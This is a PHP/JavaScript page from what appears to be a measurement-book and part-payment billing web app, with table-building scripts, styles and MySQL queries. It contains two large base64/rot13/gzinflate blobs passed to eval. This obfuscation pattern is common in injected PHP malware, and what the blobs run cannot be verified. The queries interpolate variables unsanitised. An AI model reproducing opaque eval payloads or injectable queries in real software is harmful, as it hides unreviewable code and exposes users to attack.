							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str"+itemid).value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "@#*#@" + DpmRemarks;
		//alert(result);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		
	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		var temp = 0; var temp2 = 0;
		var ActualSlmQty = $("#hid_slm_qty").val();
		var TotalPpayQty = 0;
		if((ActualSlmQty != "")&&(Number(ActualSlmQty) != 0)){
			$('input[name="txt_partpay_qty_slm[]"]').each(function() {
				var PpayQty = $(this).val();
				if(PpayQty != ""){
					temp2++;
				}
				if((PpayQty != "")&&(Number(PpayQty) != 0)){
					TotalPpayQty = TotalPpayQty + Number(PpayQty);
				}
				if(TotalPpayQty != 0){
					var TotalPpayQty2 = Number(TotalPpayQty).toFixed(3);
					TotalPpayQty = Number(TotalPpayQty2);
				}
			});
			if((ActualSlmQty != TotalPpayQty)&&(temp2 > 0)){
				temp = 1;
			}
			//alert(ActualSlmQty); alert(TotalPpayQty)
		}
		//if(temp == 1){ ///IMPORTANT COMMENTED FOR TATA ELECTRICAL NEED TO ENABLE 27.03.2023
			//swal("Total part payment qty should be equal to Since Last Measurement Qty."); ///IMPORTANT COMMENTED FOR TATA ELECTRICAL NEED TO ENABLE  27.03.2023
		//}else{ ///IMPORTANT COMMENTED FOR TATA ELECTRICAL NEED TO ENABLE  27.03.2023
			swal({   title: "Are you sure?",   
				text: "You want to update this data..?!",   
				//type: "warning",   
				showCancelButton: true,   
				confirmButtonColor: "#DD6B55",   
				confirmButtonText: "Yes, Update!",   
				cancelButtonText: "No, Cancel!",   
				closeOnConfirm: false,   
				closeOnCancel: false }, 
				function(isConfirm){   
				if (isConfirm) 
				{     
					saveDataDetails();  
				} 
				else 
				{     
					swal("Cancelled", "Your data not updated:)", "error");   
				} 
			});
		//}  ///IMPORTANT COMMENTED FOR TATA ELECTRICAL NEED TO ENABLE  27.03.2023
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			//type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
	jQuery(function ($) 
	{
	// Load dialog on click
		$('input[name="check"]').click(function (e) 
		{
			var section_type = $(this).attr("data-sec_type");
			if(section_type == 'III'){
				var subdivid = $(this).attr('data-subdivid');
				var sheetid = $(this).attr('data-sheetid');
				var rbn = $(this).attr('data-rbn');
				$(location).attr('href', 'PartPayment/PartPayment.php?subdivid='+subdivid+'&sheetid='+sheetid+'&rbn='+rbn)
			}else{
				if($(this).is(':checked'))
				{
					// THIS PART IS FOR SINCE LAST MEASUREMENT SECTION //
					var SlmTotalAmount = 0, DpmPayableAmount = 0;
					var itemdetails = this.value;
					var split_itemdetails = itemdetails.split("*");
					var subdivid 	= split_itemdetails[0];
					var subdivname 	= split_itemdetails[1];
					var description = split_itemdetails[2];
					var slm_qty		= Number(split_itemdetails[3]);
					var dpm_qty		= Number(split_itemdetails[4]);
					var rate 		= Number(split_itemdetails[5]); 
					var itemunit	= split_itemdetails[6];
					var sheetid		= split_itemdetails[7];
						document.getElementById("txt_item_no").value = subdivname;
						document.getElementById("txt_item_id").value = subdivid;
						document.getElementById("txt_item_desc").value = description;
						document.getElementById("txt_slm_qty").value = slm_qty.toFixed(3)+" "+itemunit;
						document.getElementById("txt_dpm_qty").value = dpm_qty.toFixed(3)+" "+itemunit;
						document.getElementById("txt_item_rate_slm0").value = rate.toFixed(2);
						document.getElementById("hid_slm_qty").value = slm_qty.toFixed(3);
						document.getElementById("hid_dpm_qty").value = dpm_qty.toFixed(3);
						//var tablerow;
						//tablerow = "<tr><td>"+subdivname+"</td><td>"+description+"</td></tr>";
						//$('#table2 tr:last').after(tablerow);
						
					// THIS PART IS FOR DEDUCT PREVIOUS MEASUREMENT SECTION //
					getDPMdetaiils(sheetid,subdivid,rate);
					getSLMdetaiils(sheetid,subdivid,rate);
					
					//SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
					//alert(SlmTotalAmount);
					//alert(DpmPayableAmount);
					//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
					//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
					
					$('#basic-modal-content').modal();
					
				}
			}
			//return false;
		});
		
		$('#btn_save').click(function (e) 
		{
			if($('#table2 tr').size()>1)
			{
				//$('#table2 tr:last-child').remove();
				var temp = 1;
			}
			/*if(temp == 1)
			{
				$.modal.close();
				}*/
			
		});
		
	});
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#900C3F;
	/*color:#921601;*/
	border: 1px solid #d7d8d6;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #d7d8d6;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}
.fontcolor2
{
	color:#de0117;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-weight:bold;
	font-size:11px;
}
.table1 td:hover
{
	color:#1013A0;
}
.popuptitle
{
	/*background-color:#0080FF;*/
	background-color:#046CA8;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #d7d8d6;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #d7d8d6;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#046CA8;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #046CA8;
	-webkit-box-shadow: 0px 1px 0px 0px #046CA8;
	box-shadow: 0px 1px 0px 0px #046CA8;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #046CA8));
	background:-moz-linear-gradient(top, #0080FF 5%, #046CA8 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #046CA8 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #046CA8 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #046CA8 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #046CA8 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#046CA8',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}

.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
	text-align:right;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.gradientbg {
  /* fallback */
  background-color: #014D62;
  background: url(images/linear_bg_2.png);
  background-repeat: repeat-x;

  /* Safari 4-5, Chrome 1-9 */
  background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#037595), to(#046CA8));

  /* Safari 5.1, Chrome 10+ */
  background: -webkit-linear-gradient(top, #046CA8, #037595);

  /* Firefox 3.6+ */
  background: -moz-linear-gradient(top, #046CA8, #037595);

  /* IE 10 */
  background: -ms-linear-gradient(top, #046CA8, #037595);

  /* Opera 11.10+ */
  background: -o-linear-gradient(top, #046CA8, #037595);
}
.borderstyle
{
	border-top:2px solid #046CA8; 
	border-left:2px solid #046CA8; 
	border-right:2px solid #046CA8;
	border-bottom:2px solid #046CA8;
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="black" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<table width="95%" height="56px" align="center" class="label table1" bgcolor="#046CA8">
	<tr bgcolor="#046CA8" style=" width:95%">
		<td style="color:#FFFFFF; border:none; width:94%; position:fixed; background:#046CA8; vertical-align:middle; line-height:24px;" height="48px" class="" align="center">
		<?php echo "Abstract Cost for ".$short_name." for the period of ".date("d/m/Y", strtotime($fromdate))." to ".date("d/m/Y", strtotime($todate)); ?>
		<br/>
		<?php echo "RAB : ".$runn_acc_bill_no; ?>
		</td>
	</tr>
</table>

<!--<div class="label table1" style="position:fixed; height:48px; line-height:30px; width:95%; color:#FFFFFF; background-color:#046CA8; left:2%;" align="center">
	<?php echo "Abstract Cost for ".$short_name." for the period of ".date("d/m/Y", strtotime($fromdate))." to ".date("d/m/Y", strtotime($todate)); ?>
	<br/>
	<?php echo "RAB : ".$runn_acc_bill_no; ?>
</div>-->
<form name="form" method="post">
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

?>
<?php echo $table; ?>
<table width='95%' cellpadding='3' style="" cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
<?php echo $tablehead; ?>
<tr bgcolor="#d4d8d8" style="height:1px;"><td colspan="13"></td></tr>
<?php 

include('CementVariationAmt.php');

$color_var = 0; $table_group_row = 0; $temp_array = array();$OverAllSlmAmount = 0; $OverAllDpmAmount = 0; $OverAllSlmDpmAmount = 0; $SubdividDpmStr = "";

$QSPPMasterArr = array(); $QSPPMasterMbIdArr = array();
$QSPPSLMMasterArr = array(); $QSPPSLMMasterMbIdArr = array();
$QSPPDPMMasterArr = array(); $QSPPDPMMasterMbIdArr = array();
$SelectQtySplitQuery = "select * from pp_qty_splt where sheetid = '$abstsheetid'";
$SelectQtySplitSql = mysql_query($SelectQtySplitQuery);
if($SelectQtySplitSql == true){
	if(mysql_num_rows($SelectQtySplitSql)>0){
		while($QSPPList = mysql_fetch_object($SelectQtySplitSql)){
			$QSPPQty 	= $QSPPList->qty;
			$QSPPPerc 	= $QSPPList->percent;
			$QSPPRate 	= $QSPPList->rate;
			$QSPPMBId 	= $QSPPList->gr_par_id;//gpmbid;
			$QSPPRbn 	= $QSPPList->rbn;
			$QSPPAmt = round(($QSPPQty*$QSPPRate*$QSPPPerc/100),2); //echo $QSPPAmt."<br/>";
			
			if($QSPPRbn == $rbn){
				if(in_array($QSPPMBId, $QSPPSLMMasterMbIdArr)){
					$QSPPSLMMasterArr[$QSPPMBId] = $QSPPSLMMasterArr[$QSPPMBId] + $QSPPAmt;
				}else{
					array_push($QSPPSLMMasterMbIdArr,$QSPPMBId);
					$QSPPSLMMasterArr[$QSPPMBId] = $QSPPAmt;
				}
			}else{
				if(in_array($QSPPMBId, $QSPPDPMMasterMbIdArr)){
					$QSPPDPMMasterArr[$QSPPMBId] = $QSPPDPMMasterArr[$QSPPMBId] + $QSPPAmt;
				}else{
					array_push($QSPPDPMMasterMbIdArr,$QSPPMBId);
					$QSPPDPMMasterArr[$QSPPMBId] = $QSPPAmt;
				}
			}
		}
	}
}
$PPayRefArr = array();


$unionqur = "(SELECT subdivid  FROM mbookgenerate WHERE sheetid = '$abstsheetid') UNION (SELECT subdivid  FROM measurementbook WHERE sheetid = '$abstsheetid' AND (part_pay_flag = '0' OR part_pay_flag = '1'))";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) { $subdivid_list .= $Listsubdivid['subdivid']."*"; }
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);
foreach($subdivisionlist_1 as $key => $summ_1)
{
   if($summ_1 != "")
   {
      $subdivisionlist_2 .= $summ_1.",";
   }
}
$subdivisionlist = explode(',',rtrim($subdivisionlist_2,","));
for($i=0;$i<count($subdivisionlist);$i++)
{
	eval(str_rot13(gzinflate(str_rot13(base64_decode('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